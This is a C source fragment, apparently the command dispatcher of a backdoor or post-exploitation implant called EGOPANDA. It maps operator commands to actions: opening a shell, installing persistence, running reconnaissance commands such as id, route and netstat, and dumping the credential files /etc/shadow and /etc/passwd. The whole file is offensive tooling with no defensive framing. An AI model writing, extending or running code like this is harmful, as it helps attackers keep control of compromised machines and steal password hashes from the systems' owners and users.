/* EGOPANDA Parsing function */

void parseCMD(char *input, char *version, char *source, int socket)
{
    if (strcmp(input, "help") == 0)
    {
        printHelp();
        fflush(stdout);
    }
    else if (strcmp(input, "clear") == 0)
    {
        system("clear");
    }
    else if (strcmp(input, "shell") == 0)
    {
        cmdShell();
    }
    else if (strcmp(input, "ls") == 0)
    {
        system("ls");
    }
    else if (strcmp(input, "version") == 0)
    {
        printVersion(version);
        fflush(stdout);
    }
    else if (strcmp(input, "persist") == 0)
    {
        persist(source);
        fflush(stdout);
    }
    else if (strcmp(input, "id") == 0)
    {
        system("id");
    }
    else if (strcmp(input, "pid") == 0)
    {
        getPid();
        fflush(stdout);
    }
    else if (strcmp(input, "route") == 0)
    {
        system("route");
    }
    else if (strcmp(input, "netstat") == 0)
    {
        system("netstat -pant");
    }
    else if (strcmp(input, "shadow") == 0)
    {
        system ("cat /etc/shadow");
    }
    else if (strcmp(input, "passwd") == 0)
    {
        system("cat /etc/passwd");
    }
    else
    {
        printHelp();
        fflush(stdout);
    }
}